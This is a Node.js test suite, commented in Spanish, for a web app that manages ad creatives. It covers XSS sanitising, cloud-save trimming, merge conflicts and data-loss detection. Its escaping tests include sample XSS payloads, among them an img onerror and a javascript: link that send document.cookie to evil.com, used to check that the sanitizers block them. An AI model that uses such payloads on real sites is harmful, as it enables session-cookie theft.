#!/usr/bin/env node
// ============================================================================
//  Suite de pruebas de index.html.        Ejecutar:  node scripts/test.js
//
//  Extrae el código REAL de index.html (por NOMBRE de función, no por número de
//  línea, para que no se rompa cuando el archivo se edita) y lo ejercita contra
//  casos que ya fallaron alguna vez. Cada bloque protege un arreglo concreto:
//
//    #2  escape de HTML y validación de URLs   (XSS almacenado compartido)
//    #6  recorte del payload en 3 escalones    (el guardado que se revertía)
//    #1  merge por campo a 3 bandas            (cambios que desaparecían)
//    #5  detección de pérdida de datos         (vaciados que no se veían)
//    #4  contraseñas fuera del estado
//
//  Las pruebas que necesitan DOM (inyección real sobre las funciones de render)
//  no corren aquí: están en scripts/test-dom.js — ver instrucciones al final.
// ============================================================================
// Sin 'use strict' a propósito: las funciones se cargan con eval() directo desde
// index.html, y en modo estricto sus declaraciones no saldrían del ámbito del eval.
const fs = require('fs');
const path = require('path');

const SRC = path.join(__dirname, '..', 'index.html');
const txt = fs.readFileSync(SRC, 'utf8');

// ── Extracción por nombre ───────────────────────────────────────────────────
function extraerFn(nombre) {
  const i = txt.indexOf('function ' + nombre + '(');
  if (i < 0) throw new Error('No se encontró function ' + nombre + '() en index.html');
  let d = 0;
  for (let k = txt.indexOf('{', i); k < txt.length; k++) {
    if (txt[k] === '{') d++;
    else if (txt[k] === '}') { d--; if (d === 0) return txt.slice(i, k + 1); }
  }
  throw new Error('Llaves sin cerrar en ' + nombre);
}
function extraerConst(nombre) {
  const re = new RegExp('const ' + nombre + '\\s*=\\s*\\[[\\s\\S]*?\\];');
  const m = txt.match(re);
  if (!m) throw new Error('No se encontró const ' + nombre);
  return m[0];
}
// El bloque de recorte de saveToCloud, entre dos anclas estables.
function extraerRecorte() {
  const a = txt.indexOf('const stateToSave = {');
  const b = txt.indexOf('stateToSave._savedBy');
  if (a < 0 || b < 0) throw new Error('No se encontró el bloque de recorte de saveToCloud');
  const bloque = txt.slice(a, b);
  for (const ancla of ['roughSize > 500000', 'roughSize > 900000', 'roughSize > 1200000']) {
    if (!bloque.includes(ancla)) throw new Error('Falta el escalón "' + ancla + '" en saveToCloud');
  }
  return bloque;
}

// ── Entorno mínimo para el código extraído ──────────────────────────────────
let state = {};
let currentUser = null;
const _almacen = new Map();
const localStorage = {
  setItem: (k, v) => _almacen.set(k, String(v)),
  getItem: k => (_almacen.has(k) ? _almacen.get(k) : null),
  removeItem: k => _almacen.delete(k),
};
function logError() {}          // el registro real se prueba en el navegador
function showToast() {}
const PAYLOAD_KEY = 'an_last_payload_v1';
const BASE_KEY = 'an_sync_base_v1';
let _conflictosMerge = [];

const FUNCIONES = ['esc', 'escJs', 'safeUrl', 'safeSrc', '_stripBlobs', '_stripPasswords',
  '_leanState', '_autoSnapshot', '_hash', '_huellaLista', '_guardarBase', '_leerBase',
  '_mergeItem', '_mergeArraysById', '_itemScore', '_dataScore', '_perdidaAnormal'];
for (const f of FUNCIONES) eval(extraerFn(f));
// `const` dentro de un eval tampoco escapa a su ámbito: se convierten en asignación
// sobre variables ya declaradas aquí fuera.
var _SCORE_KEYS, _MERGE_LIST_KEYS;
eval(extraerConst('_SCORE_KEYS').replace(/^const /, ''));
eval(extraerConst('_MERGE_LIST_KEYS').replace(/^const /, ''));
if (!Array.isArray(_SCORE_KEYS) || !Array.isArray(_MERGE_LIST_KEYS)) {
  console.error('No se pudieron cargar las listas de claves desde index.html'); process.exit(1);
}
const _RECORTE = extraerRecorte();

// Ejecuta el recorte real de saveToCloud sobre un estado dado.
function recortar(st) {
  state = st;
  const savedAt = Date.now();
  let stateToSave, roughSize;
  eval(_RECORTE.replace('const stateToSave =', 'stateToSave =').replace(/let roughSize/, 'roughSize'));
  return { stateToSave, kb: Math.round(roughSize / 1024) };
}

// ── Mini framework ──────────────────────────────────────────────────────────
let pasaron = 0, fallaron = 0, bloque = '';
const seccion = n => { bloque = n; console.log('\n\x1b[1m' + n + '\x1b[0m'); };
function ok(desc, condicion, detalle) {
  if (condicion) { pasaron++; console.log('  \x1b[32m✓\x1b[0m ' + desc); }
  else { fallaron++; console.log('  \x1b[31m✗ ' + desc + '\x1b[0m' + (detalle ? '\n      → ' + detalle : '')); }
}
const eq = (desc, got, want) => ok(desc, got === want, 'obtenido ' + JSON.stringify(got) + ' · esperado ' + JSON.stringify(want));

// ════════════════════════════════════════════════════════════════════════════
seccion('#2 · safeUrl bloquea esquemas ejecutables');
eq('javascript:', safeUrl('javascript:alert(document.cookie)'), '');
eq('JaVaScRiPt: (mayúsculas)', safeUrl('JaVaScRiPt:alert(1)'), '');
eq('javascript: con espacios delante', safeUrl('   javascript:alert(1)'), '');
eq('vbscript:', safeUrl('vbscript:msgbox(1)'), '');
eq('data:text/html', safeUrl('data:text/html,<script>alert(1)</script>'), '');
eq('file://', safeUrl('file:///etc/passwd'), '');
eq('cadena vacía', safeUrl(''), '');
eq('null', safeUrl(null), '');

seccion('#2 · safeUrl deja pasar lo legítimo');
eq('https', safeUrl('https://facebook.com/ads/123'), 'https://facebook.com/ads/123');
eq('http', safeUrl('http://drive.google.com/x'), 'http://drive.google.com/x');
eq('mailto', safeUrl('mailto:a@b.com'), 'mailto:a@b.com');
eq('ruta relativa', safeUrl('/algo'), '/algo');
eq('dominio sin esquema → https', safeUrl('drive.google.com/file/d/1'), 'https://drive.google.com/file/d/1');
eq('comillas dentro de la URL se escapan', safeUrl('https://x.com/?a="onmouseover="alert(1)'),
  'https://x.com/?a=&quot;onmouseover=&quot;alert(1)');

seccion('#2 · safeSrc (archivos que sube el equipo)');
eq('data:image pasa', safeSrc('data:image/png;base64,AAA'), 'data:image/png;base64,AAA');
eq('data:video pasa', safeSrc('data:video/mp4;base64,AAA'), 'data:video/mp4;base64,AAA');
eq('blob: pasa', safeSrc('blob:https://x/abc'), 'blob:https://x/abc');
eq('data:text/html NO pasa', safeSrc('data:text/html,<script>alert(1)</script>'), '');
eq('javascript: NO pasa', safeSrc('javascript:alert(1)'), '');

seccion('#2 · esc (texto y atributos)');
eq('etiqueta script', esc('<script>alert(1)</script>'), '&lt;script&gt;alert(1)&lt;/script&gt;');
eq('img onerror', esc('<img src=x onerror=alert(1)>'), '&lt;img src=x onerror=alert(1)&gt;');
eq('ruptura de atributo', esc('" onmouseover="alert(1)'), '&quot; onmouseover=&quot;alert(1)');
eq('comilla simple', esc("O'Brien"), 'O&#39;Brien');
eq('ampersand', esc('Ropa & Moda'), 'Ropa &amp; Moda');
eq('null → vacío', esc(null), '');
eq('número', esc(42), '42');
eq('texto normal intacto', esc('Creativo hook 3 - v2'), 'Creativo hook 3 - v2');

seccion('#2 · escJs (dentro de onclick="fn(\'…\')")');
eq('comilla simple escapada', escJs("x'); alert(1); ('"), "x\\'); alert(1); (\\'");
eq('backslash duplicado', escJs('a\\b'), 'a\\\\b');
eq('comilla doble → entidad', escJs('a"b'), 'a&quot;b');

seccion('#2 · render simulado con datos maliciosos');
{
  const malo = {
    name: '<img src=x onerror="fetch(\'https://evil.com?c=\'+document.cookie)">',
    link: 'javascript:fetch("https://evil.com?c="+document.cookie)',
    hook: 'Normal " onmouseover="alert(1)',
  };
  const html = `<a href="${safeUrl(malo.link)}" title="${esc(malo.link)}">ver</a>`
    + `<span>${esc(malo.name)}</span><input value="${esc(malo.hook)}">`;
  ok('el href queda vacío (no ejecuta)', /href=""/.test(html), html.slice(0, 120));
  ok('no sobrevive ningún <img', !/<img/.test(html), html.slice(0, 120));
  ok('no se puede romper el atributo value', !/value="Normal " onmouseover/.test(html), html.slice(0, 120));
}

// ════════════════════════════════════════════════════════════════════════════
seccion('#4 · las contraseñas no viven en el estado compartido');
{
  const conPw = [{ id: 'u1', name: 'A', email: 'a@b.c', role: 'admin', pw: 'secreto', active: true },
                 { id: 'u2', name: 'B', email: 'b@b.c', role: 'editor', pw: 'otra' }];
  const limpio = _stripPasswords(conPw);
  ok('elimina pw', limpio.every(u => u.pw === undefined), JSON.stringify(limpio));
  ok('conserva el resto de campos', limpio[0].name === 'A' && limpio[0].role === 'admin');
  eq('no muta el original', conPw[0].pw, 'secreto');
  ok('tolera lo que no es lista', _stripPasswords(null) === null);
}

// ════════════════════════════════════════════════════════════════════════════
seccion('#6 · recorte del payload (regresión del guardado que se revertía)');
{
  const b64 = 'data:image/png;base64,' + 'A'.repeat(40000);
  const creativo = i => ({
    id: 'cr' + i, nombre: 'Creativo ' + i, thumb: b64,
    metaSyncHistory: Array.from({ length: 20 }, () => ({ ts: 1, spend: 12.5, clicks: 210 })),
    metaBreakdown: { adsets: Array.from({ length: 6 }, (_, k) => ({
      id: 'as' + k, name: 'Conjunto ' + k, spend: 30,
      ads: Array.from({ length: 5 }, (_, j) => ({ id: 'ad' + j, name: 'Anuncio ' + j, spend: 6 })) })) },
  });
  const mk = (n, nVersions = 0) => {
    const s = {
      _savedAt: Date.now(), creativos: Array.from({ length: n }, (_, i) => creativo(i)),
      recursos: [], users: [], products: [], costCaps: [], adAccounts: [], pixels: [],
      landings: [], enfoques: [], team: [], painPoints: [], metas: [], versions: [],
    };
    const gordo = JSON.stringify({ creativos: s.creativos.map(c => ({ ...c, thumb: null })) });
    s.versions = Array.from({ length: nVersions }, (_, k) => ({
      id: (k % 2 ? 'auto_' : 'man_') + k, snapshot: gordo, ts: Date.now(), auto: k % 2 === 1 }));
    return s;
  };

  const normal = recortar(mk(100, 8));
  ok('100 creativos + 8 snapshots caben (' + normal.kb + 'KB)', normal.kb < 1024, normal.kb + 'KB');
  eq('no se pierde ningún creativo', normal.stateToSave.creativos.length, 100);
  ok('el base64 nunca llega a la nube', !JSON.stringify(normal.stateToSave).includes('data:image'));
  eq('el historial de sync se recorta a 5', normal.stateToSave.creativos[0].metaSyncHistory.length, 5);
  eq('en operación normal se conserva el desglose',
    normal.stateToSave.creativos.filter(c => c.metaBreakdown).length, 100);

  const extremo = recortar(mk(400, 20));
  ok('400 creativos + 20 snapshots caben (' + extremo.kb + 'KB)', extremo.kb < 1024, extremo.kb + 'KB');
  eq('tampoco aquí se pierde un creativo', extremo.stateToSave.creativos.length, 400);

  // El escalón 3 debe activarse solo cuando hace falta, y soltar el desglose, nunca datos.
  let huboRecorte = false, huboConservado = false;
  for (const n of [100, 250, 400, 700, 1000, 2000]) {
    const r = recortar(mk(n, 4));
    const solto = r.stateToSave.creativos.filter(c => c.metaBreakdown).length === 0;
    solto ? (huboRecorte = true) : (huboConservado = true);
    ok(n + ' creativos → ' + r.kb + 'KB, desglose ' + (solto ? 'soltado' : 'conservado'),
      r.stateToSave.creativos.length === n && r.kb < 1024,
      r.stateToSave.creativos.length + '/' + n + ' creativos, ' + r.kb + 'KB');
  }
  ok('el desglose se conserva mientras el payload lo permite', huboConservado);
  ok('el desglose se suelta cuando el payload lo exige', huboRecorte);
}

seccion('#6 · el estado no se infla con el uso');
{
  const b64 = 'data:image/png;base64,' + 'A'.repeat(40000);
  state = {
    creativos: Array.from({ length: 100 }, (_, i) => ({
      id: 'c' + i, thumb: b64, metaSyncHistory: Array.from({ length: 20 }, () => ({ ts: 1 })),
      metaBreakdown: { adsets: [] } })),
    versions: Array.from({ length: 8 }, (_, k) => ({ id: 'v' + k, snapshot: 'x'.repeat(20000), auto: k % 2 === 1 })),
  };
  const antes = JSON.stringify(state).length;
  for (let i = 0; i < 10; i++) _autoSnapshot();
  ok('tras 10 guardados el estado no crece', JSON.stringify(state).length <= antes,
    Math.round(antes / 1024) + 'KB → ' + Math.round(JSON.stringify(state).length / 1024) + 'KB');
  ok('los snapshots no se anidan entre sí',
    !state.versions.some(v => (v.snapshot || '').includes('"versions"')));
  ok('máximo 3 manuales + 2 automáticos', state.versions.length <= 5, 'hay ' + state.versions.length);

  const lean = _leanState(state, true);
  ok('el respaldo agresivo suelta el historial', lean.creativos[0].metaSyncHistory === undefined);
  eq('pero conserva todos los creativos', lean.creativos.length, 100);
}

// ════════════════════════════════════════════════════════════════════════════
seccion('#1 · merge por campo — dos personas editando a la vez');
{
  state = { tombstones: [] };
  const base = () => _leerBase().creativos;
  const v0 = { id: 'c1', name: 'Gomitas v2', status: 'testeo', presup: 100,
               respTesteo: 'Luis', hook: '¿No come?', metrics: { gasto: 50, ventas: 3 } };
  _guardarBase({ creativos: [v0] });

  _conflictosMerge = [];
  const yo = { ...v0, presup: 250, hook: 'Hook nuevo' };       // yo: presupuesto y hook
  const el = { ...v0, status: 'validado', respTesteo: 'Ana' };  // el otro: etapa y tester
  const r = _mergeArraysById([yo], [el], true, base())[0];
  eq('conserva MI presupuesto', r.presup, 250);
  eq('conserva MI hook', r.hook, 'Hook nuevo');
  eq('conserva SU etapa', r.status, 'validado');
  eq('conserva SU tester', r.respTesteo, 'Ana');
  eq('no inventa cambios', r.name, 'Gomitas v2');
  eq('sin conflictos falsos', _conflictosMerge.length, 0);

  _conflictosMerge = [];
  const r2 = _mergeArraysById([{ ...v0, presup: 250 }], [{ ...v0, presup: 300 }], true, base())[0];
  eq('empate real: gana la nube al sincronizar', r2.presup, 300);
  eq('y queda avisado', _conflictosMerge.length, 1);

  _conflictosMerge = [];
  const r3 = _mergeArraysById([{ ...v0, presup: 250 }], [{ ...v0, presup: 300 }], false, base())[0];
  eq('empate real: gana lo local al guardar', r3.presup, 250);

  const r4 = _mergeArraysById([yo, { id: 'c2', name: 'Mío' }], [el, { id: 'c3', name: 'Suyo' }], true, base());
  ok('conserva el elemento nuevo local', r4.some(c => c.id === 'c2'), JSON.stringify(r4.map(c => c.id)));
  ok('conserva el elemento nuevo remoto', r4.some(c => c.id === 'c3'), JSON.stringify(r4.map(c => c.id)));
  eq('no duplica el existente', r4.filter(c => c.id === 'c1').length, 1);

  state.tombstones = [{ id: 'c1', ts: Date.now() }];
  eq('lo borrado no resucita', _mergeArraysById([yo], [el], true, base()).length, 0);
  state.tombstones = [];

  const r6 = _mergeArraysById([yo], [el], true, null)[0];
  ok('sin huella previa cae al modo anterior', r6.status === 'validado' && r6.presup === 100, JSON.stringify(r6));
  eq('las listas de strings se siguen uniendo', _mergeArraysById(['a', 'b'], ['b', 'c'], true, null).length, 3);
}

seccion('#1 · la huella se refresca entre rondas');
{
  state = { tombstones: [] };
  const v0 = { id: 'c1', name: 'Creativo', status: 'testeo', presup: 100, respTesteo: 'Luis' };
  _guardarBase({ creativos: [v0] });
  const m1 = _mergeArraysById([{ ...v0, presup: 250 }], [{ ...v0, status: 'validado' }], true, _leerBase().creativos)[0];
  ok('ronda 1: se combinan ambos cambios', m1.presup === 250 && m1.status === 'validado');

  // Sin refrescar la huella, mi 250 seguiría contando como "cambio mío" para siempre
  // y revertiría el cambio del otro en cada ronda posterior.
  _guardarBase({ creativos: [m1] });
  _conflictosMerge = [];
  const m2 = _mergeArraysById([{ ...m1 }], [{ ...m1, presup: 180 }], true, _leerBase().creativos)[0];
  eq('ronda 2: acepta el cambio ajeno', m2.presup, 180);
  eq('ronda 2: sin conflicto fantasma', _conflictosMerge.length, 0);

  _guardarBase({ creativos: [m2] });
  const sinCampo = { ...m2 }; delete sinCampo.respTesteo;
  const m3 = _mergeArraysById([sinCampo], [{ ...m2, status: 'escalando' }], true, _leerBase().creativos)[0];
  eq('respeta que YO borré un campo', m3.respTesteo, undefined);
  eq('y conserva SU cambio de etapa', m3.status, 'escalando');

  _guardarBase({ creativos: [{ ...m3, metrics: { gasto: 50, ventas: 3 } }] });
  const conM = { ...m3, metrics: { gasto: 50, ventas: 3 } };
  const m4 = _mergeArraysById([{ ...conM, name: 'Renombrado' }], [{ ...conM, metrics: { gasto: 90, ventas: 7 } }],
    true, _leerBase().creativos)[0];
  ok('métricas de Meta y renombrado conviven', m4.name === 'Renombrado' && m4.metrics.gasto === 90,
    m4.name + ' / ' + JSON.stringify(m4.metrics));

  const l = [{ id: 'a', v: 1 }, { id: 'b', v: 1 }, { id: 'c', v: 1 }];
  _guardarBase({ creativos: l });
  eq('el orden de la lista no se altera',
    _mergeArraysById(l, l, true, _leerBase().creativos).map(x => x.id).join(','), 'a,b,c');
  ok('la huella no viaja dentro del estado', !JSON.stringify(state).includes('an_sync_base'));
}

// ════════════════════════════════════════════════════════════════════════════
seccion('#5 · detección de pérdida de datos');
{
  const vacia = () => Object.fromEntries(_SCORE_KEYS.map(k => [k, []]));
  const pobre = (n, lleno) => Object.assign(vacia(), {
    creativos: Array.from({ length: n }, (_, i) => ({
      id: 'c' + i, name: lleno ? 'C' + i : '', hook: lleno ? 'h' : '', metrics: lleno ? { a: 1 } : {} })),
    metas: [{ id: 'm' }] });
  const rico = (n, lleno) => Object.assign(vacia(), {
    creativos: Array.from({ length: n }, (_, i) => ({
      id: 'c' + i, name: lleno ? 'Creativo ' + i : '', status: 'testeo', hook: lleno ? 'hook largo' : '',
      publico: lleno ? 'mamás' : '', resp: lleno ? 'Ana' : '', guion: lleno ? 'g' : '',
      angle: lleno ? 'Miedo' : '', painPoint: lleno ? 'p' : '', link: lleno ? 'https://x' : '',
      metrics: lleno ? { presup: 100, gasto: 90, ventas: 5, cpa: 18, ctr: 2.1, revenue: 300 } : {} })) });

  ok('detecta un vaciado con elementos pobres', !!_perdidaAnormal(pobre(20, false), pobre(20, true)),
    _dataScore(pobre(20, false)) + ' vs ' + _dataScore(pobre(20, true)));
  ok('detecta un vaciado con elementos ricos', !!_perdidaAnormal(rico(20, false), rico(20, true)),
    _dataScore(rico(20, false)) + ' vs ' + _dataScore(rico(20, true)));

  const b = rico(20, true);
  const clonar = () => JSON.parse(JSON.stringify(b));
  const e1 = clonar(); e1.creativos[0].hook = 'corto';
  ok('acortar un texto NO bloquea', _perdidaAnormal(e1, b) === null, String(_perdidaAnormal(e1, b)));
  const e2 = clonar(); e2.creativos[1].guion = ''; e2.creativos[2].painPoint = '';
  ok('vaciar dos campos NO bloquea', _perdidaAnormal(e2, b) === null, String(_perdidaAnormal(e2, b)));
  const e3 = clonar(); e3.creativos.splice(3, 2);
  ok('borrar 2 de 20 creativos NO bloquea', _perdidaAnormal(e3, b) === null, String(_perdidaAnormal(e3, b)));
  const e4 = clonar(); e4.creativos.forEach(c => { c.guion = ''; });
  ok('vaciar un campo en todos NO bloquea', _perdidaAnormal(e4, b) === null, String(_perdidaAnormal(e4, b)));

  const d1 = clonar(); d1.creativos = d1.creativos.slice(0, 3);
  ok('un borrado masivo SÍ se detecta', !!_perdidaAnormal(d1, b));

  const conListas = clonar();
  conListas.metas = Array.from({ length: 6 }, (_, i) => ({ id: 'm' + i, nombre: 'M' + i, objetivo: 100 }));
  conListas.costCaps = Array.from({ length: 8 }, (_, i) => ({ id: 'cc' + i, campaign: 'C' + i, bid: 2 }));
  conListas.team = Array.from({ length: 4 }, (_, i) => ({ id: 't' + i, name: 'T' + i }));
  const sinListas = JSON.parse(JSON.stringify(conListas));
  sinListas.metas = []; sinListas.costCaps = []; sinListas.team = [];
  ok('la desaparición de metas/costCaps/team SÍ se detecta', !!_perdidaAnormal(sinListas, conListas));

  ok('estados iguales no bloquean', _perdidaAnormal(b, b) === null, String(_perdidaAnormal(b, b)));
  const mas = clonar(); mas.creativos.push({ id: 'zz', name: 'nuevo' });
  ok('la nube con más datos no bloquea', _perdidaAnormal(mas, b) === null, String(_perdidaAnormal(mas, b)));
  ok('los snapshots no distorsionan el puntaje',
    !_SCORE_KEYS.includes('versions'), '_SCORE_KEYS no debe incluir versions');
}

// ════════════════════════════════════════════════════════════════════════════
seccion('Productos: el nombre nunca se convierte a número');
{
  // updateProduct usa recalc()/calcDirty() (DOM) → se stubbean para poder correr la función real
  const sandbox = { recalc(){}, calcDirty(){}, state:{ products:[
    { id:'p1', name:'American Fit x1', price:39.9, qty:1, cost:3.5, mix:5, flete:4.5 },
  ] } };
  const grabSet = n => (txt.match(new RegExp('const ' + n + '\\s*=\\s*new Set\\([^)]*\\);')) || [])[0].replace('const','var');
  const codigo = grabSet('_PRODUCT_TEXT_FIELDS') + '\n'
    + grabSet('_PRODUCT_NUM_FIELDS') + '\n'
    + extraerFn('updateProduct');
  with (sandbox) { eval(codigo); }
  const up = sandbox.updateProduct || (function(){ with(sandbox){ return updateProduct; } })();

  // Vaciar el nombre no lo vuelve 0
  up('p1','name','');
  eq('nombre vaciado sigue siendo texto', typeof sandbox.state.products[0].name, 'string');
  // Nombre "39" se queda como string "39", no número 39
  up('p1','name','39');
  ok('nombre numérico se conserva como texto', sandbox.state.products[0].name === '39' && typeof sandbox.state.products[0].name === 'string');
  // Un campo numérico sí se convierte
  up('p1','price','45.5');
  eq('precio sí se convierte a número', sandbox.state.products[0].price, 45.5);
  eq('precio inválido cae a 0', (up('p1','price','abc'), sandbox.state.products[0].price), 0);
}

// ════════════════════════════════════════════════════════════════════════════
seccion('Productos: reparación de nombres corrompidos al cargar');
{
  // loadState repara nombres que quedaron como número por el bug anterior
  const fn = extraerFn('loadState');
  ok('loadState convierte name numérico a string',
    /typeof p\.name === 'number'\) p\.name = String\(p\.name\)/.test(fn),
    'la migración de reparación debe estar presente');
}

// ════════════════════════════════════════════════════════════════════════════
seccion('Productos: ids duplicados no borran de más');
{
  // _ensureUniqueProductIds debe dar id único a cada producto
  const sandbox = { uid: () => '_' + Math.random().toString(36).substr(2,9),
    state:{ products:[ {id:'x',name:'A'}, {id:'x',name:'B'}, {id:'x',name:'C'}, {name:'D'} ] } };
  const codigo = extraerFn('_ensureUniqueProductIds');
  with (sandbox) { eval(codigo); _ensureUniqueProductIds(); }
  const ids = sandbox.state.products.map(p => p.id);
  ok('todos los ids son únicos', new Set(ids).size === ids.length, JSON.stringify(ids));
  ok('ningún id es nulo', ids.every(id => id != null), JSON.stringify(ids));

  // Con ids únicos, borrar un subconjunto NO elimina el resto
  const productos = sandbox.state.products;
  const seleccion = new Set([productos[0].id, productos[1].id]); // 2 de 4
  const quedan = productos.filter(p => !seleccion.has(p.id));
  eq('borrar 2 de 4 deja 2', quedan.length, 2);
  ok('quedan exactamente los no seleccionados', quedan.every(p => !seleccion.has(p.id)));
}

// ════════════════════════════════════════════════════════════════════════════
seccion('Productos: borrado por referencia no elimina de más aunque haya ids repetidos');
{
  // Escenario extremo: TODOS los productos comparten el mismo id (bug original).
  // Al seleccionar por referencia de objeto, borrar 2 elimina exactamente 2.
  const a = {id:'dup',name:'A'}, b = {id:'dup',name:'B'}, cc = {id:'dup',name:'C'}, d = {id:'dup',name:'D'};
  const productos = [a, b, cc, d];
  const sel = new Set([a, b]);                       // selección por referencia
  const restantes = productos.filter(p => !sel.has(p));
  eq('con ids repetidos, borra solo 2 (no todos)', productos.length - restantes.length, 2);
  ok('quedan C y D', restantes.includes(cc) && restantes.includes(d) && !restantes.includes(a));

  // El candado: borrados nunca puede superar la selección
  const n = sel.size, borrados = productos.length - restantes.length;
  ok('candado: borrados <= seleccionados', borrados <= n, `borrados ${borrados}, sel ${n}`);
}

// ════════════════════════════════════════════════════════════════════════════
seccion('Sintaxis del bundle');
{
  const m = txt.match(/<script>([\s\S]*)<\/script>/);
  ok('hay un bloque <script> principal', !!m);
  try { new Function(m[1]); ok('el JavaScript compila', true); }
  catch (e) { ok('el JavaScript compila', false, e.message); }
  const sri = (txt.match(/integrity="sha384-/g) || []).length;
  eq('los 3 scripts de CDN llevan SRI', sri, 3);
  ok('supabase-js está fijado a una versión concreta',
    /supabase-js@\d+\.\d+\.\d+/.test(txt), 'debe ser @X.Y.Z, no @2 (flotante: rompería el SRI)');
}

// ── Resumen ─────────────────────────────────────────────────────────────────
console.log('\n' + '─'.repeat(62));
console.log(fallaron
  ? `\x1b[31m${fallaron} FALLARON\x1b[0m · ${pasaron} pasaron`
  : `\x1b[32m✓ ${pasaron} pruebas OK\x1b[0m`);
console.log('\nLas pruebas de inyección sobre el DOM real no corren en Node.');
console.log('Para esas: abre index.html en el navegador y pega scripts/test-dom.js en la consola.');
console.log('─'.repeat(62));
process.exit(fallaron ? 1 : 0);
